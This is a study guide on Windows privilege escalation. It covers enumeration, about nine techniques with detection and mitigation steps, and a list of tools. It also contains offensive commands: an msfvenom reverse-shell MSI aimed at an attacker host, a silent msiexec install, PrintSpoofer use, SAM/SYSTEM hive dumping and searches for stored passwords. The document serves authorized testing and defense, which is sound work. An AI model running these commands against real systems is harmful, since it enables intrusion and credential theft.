# Day 16: Windows Privilege Escalation

A reference guide covering common Windows privilege escalation techniques, enumeration steps, and defensive mitigations. Intended for security professionals, penetration testers, and CTF participants in authorized environments.

---

## Table of Contents

- [Overview](#overview)
- [Enumeration](#enumeration)
- [Common Techniques](#common-techniques)
  - [Unquoted Service Paths](#unquoted-service-paths)
  - [Weak Service Permissions](#weak-service-permissions)
  - [DLL Hijacking](#dll-hijacking)
  - [Always Install Elevated](#alwaysinstallelevated)
  - [Token Impersonation](#token-impersonation)
  - [Scheduled Tasks](#scheduled-tasks)
  - [Registry Autoruns](#registry-autoruns)
  - [Stored Credentials](#stored-credentials)
  - [Kernel Exploits](#kernel-exploits)
- [Tools](#tools)
- [Mitigations](#mitigations)
- [Resources](#resources)

---

## Overview

Privilege escalation on Windows refers to the process of exploiting misconfigurations, vulnerabilities, or weak permissions to move from a lower-privileged account (e.g., standard user) to a higher-privileged one (e.g., `SYSTEM`, `Administrator`).

This is a critical phase in penetration testing and red team engagements. **Only perform these techniques on systems you own or have explicit written authorization to test.**

---

## Enumeration

Before exploiting anything, gather as much information as possible about the target system.

```powershell
# Current user and privileges
whoami /all

# System information
systeminfo

# Running processes
tasklist /v

# Installed software
wmic product get name,version

# Network configuration
ipconfig /all
netstat -ano

# Firewall rules
netsh advfirewall show allprofiles

# Scheduled tasks
schtasks /query /fo LIST /v

# Services
sc query
wmic service get name,pathname,startname

# Users and groups
net user
net localgroup administrators

# Writable directories in PATH
$env:Path -split ";" | Get-Acl | Where-Object { $_.Access.FileSystemRights -match "Write" }
```

Automated enumeration tools (see [Tools](#tools)) can speed this process up significantly.

---

## Common Techniques

### Unquoted Service Paths

If a service's binary path contains spaces and is not enclosed in quotes, Windows may execute a binary in an unintended location.

**Detection:**
```powershell
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

**Exploitation:** Place a malicious executable at an earlier position in the path. For example, if the path is `C:\Program Files\My App\service.exe`, place a payload at `C:\Program.exe`.

**Mitigation:** Always enclose service binary paths in quotes.

---

### Weak Service Permissions

If a low-privileged user has write access to a service's binary or can modify service configuration, they can replace or redirect it.

**Detection:**
```powershell
# Check service binary permissions
icacls "C:\path\to\service.exe"

# Check if current user can modify service config
sc sdshow <service_name>
```

**Exploitation:** Replace the service binary with a payload, then restart the service.

**Mitigation:** Audit and restrict ACLs on service executables and registry keys.

---

### DLL Hijacking

Applications search for DLLs in a specific order. If a writable directory appears earlier in the search order, a malicious DLL can be loaded instead of the legitimate one.

**Detection:**
- Use [Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) to find `NAME NOT FOUND` DLL loads from writable directories.

**Exploitation:** Drop a crafted DLL with the expected name into the writable directory.

**Mitigation:** Use absolute paths for DLL loading, enable Safe DLL Search Mode, and audit directory permissions.

---

### AlwaysInstallElevated

If both the HKCU and HKLM registry keys for `AlwaysInstallElevated` are set to `1`, any user can install `.msi` packages with SYSTEM privileges.

**Detection:**
```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**Exploitation:**
```bash
# Generate malicious MSI (with msfvenom or similar)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o evil.msi

# Install on target
msiexec /quiet /qn /i evil.msi
```

**Mitigation:** Set both registry keys to `0` or remove them via Group Policy.

---

### Token Impersonation

Certain Windows privileges (`SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`) allow a process to impersonate other users, potentially including SYSTEM.

**Detection:**
```powershell
whoami /priv
```

**Tools:** Potato attacks (JuicyPotato, PrintSpoofer, RoguePotato) leverage these privileges.

```powershell
# Example with PrintSpoofer
PrintSpoofer.exe -i -c cmd
```

**Mitigation:** Limit which service accounts hold impersonation privileges.

---

### Scheduled Tasks

A scheduled task running as a high-privileged user with a writable executable path can be exploited.

**Detection:**
```powershell
schtasks /query /fo LIST /v | findstr /i "task name\|run as\|task to run"
```

**Exploitation:** Replace or modify the target executable with a payload.

**Mitigation:** Restrict write access to scheduled task executables and apply least privilege to task accounts.

---

### Registry Autoruns

Programs set to run at startup via the registry may execute with elevated privileges or be replaceable by low-privileged users.

**Detection:**
```powershell
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

**Mitigation:** Review autorun entries regularly and restrict registry key permissions.

---

### Stored Credentials

Windows may cache credentials in various locations.

```powershell
# Saved credentials
cmdkey /list

# Credential Manager
vaultcmd /listcreds:"Windows Credentials"

# Searching for passwords in files
findstr /si password *.txt *.xml *.ini *.config

# SAM and SYSTEM (requires SYSTEM or shadow copy access)
reg save HKLM\SAM sam.bak
reg save HKLM\SYSTEM system.bak
```

**Mitigation:** Avoid storing plaintext credentials, enforce credential hygiene, and use LAPS for local admin accounts.

---

### Kernel Exploits

Unpatched Windows kernels may be vulnerable to local privilege escalation exploits.

**Detection:**
```powershell
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
wmic qfe list brief
```

Cross-reference the patch list against known CVEs (e.g., MS16-032, CVE-2021-36934 "HiveNightmare").

**Mitigation:** Keep Windows fully patched and enable Windows Update.

---

## Tools

| Tool | Description |
|------|-------------|
| [WinPEAS](https://github.com/peass-ng/PEASS-ng) | Automated Windows privilege escalation enumeration |
| [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) | PowerShell script for common misconfigurations |
| [Seatbelt](https://github.com/GhostPack/Seatbelt) | Host-based security checks and enumeration |
| [SharpUp](https://github.com/GhostPack/SharpUp) | C# port of PowerUp |
| [BeRoot](https://github.com/AlessandroZ/BeRoot) | Cross-platform privilege escalation checker |
| [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) | Token impersonation via Print Spooler |
| [JuicyPotato](https://github.com/ohpe/juicy-potato) | SeImpersonatePrivilege exploitation |
| [Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) | Sysinternals tool for DLL hijacking discovery |

---

## Mitigations

- Apply Windows security updates promptly
- Follow the principle of least privilege for users and service accounts
- Use Microsoft LAPS for local administrator password management
- Enable and configure Windows Defender / Microsoft Defender for Endpoint
- Audit service binary paths, scheduled tasks, and registry autoruns regularly
- Use AppLocker or WDAC to restrict unauthorized executable paths
- Enable Credential Guard to protect credentials in memory
- Monitor for suspicious use of privileged tokens and lateral movement

---

## Resources

- [HackTricks - Windows Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [LOLBAS Project](https://lolbas-project.github.io/) - Living Off The Land Binaries
- [Microsoft Security Documentation](https://learn.microsoft.com/en-us/security/)
- [ired.team Windows PrivEsc Notes](https://www.ired.team/offensive-security/privilege-escalation)

---

> **Disclaimer:** This document is for educational purposes and authorized security testing only. Unauthorized access to computer systems is illegal and unethical.